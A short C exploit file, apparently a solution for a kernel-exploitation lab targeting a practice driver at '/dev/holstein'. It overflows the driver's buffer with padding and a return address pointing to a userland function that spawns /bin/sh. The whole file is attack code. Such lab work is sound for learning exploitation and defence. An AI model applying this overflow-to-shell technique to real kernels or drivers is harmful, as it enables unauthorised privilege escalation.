
//xpl.c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

void win(void) {
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};

    puts("check\n");
    execve("/bin/sh", argv, envp);
    exit(1);
}

int main(void) {
    char payload[0x800];
    setbuf(stdout, NULL);
    int fd = open("/dev/holstein", O_RDWR);
    if (fd < 0) {
        perror("open");
        exit(1);
    }
    memset(payload, 'A', sizeof(payload));
    *(uint64_t *)(payload + 0x418) = (uint64_t)win;

    printf("ez ret2win\n");

    if (write(fd, payload, sizeof(payload)) < 0) {
	    perror("write");
	    exit(1);
    }
    close(fd);
    return 0;
}

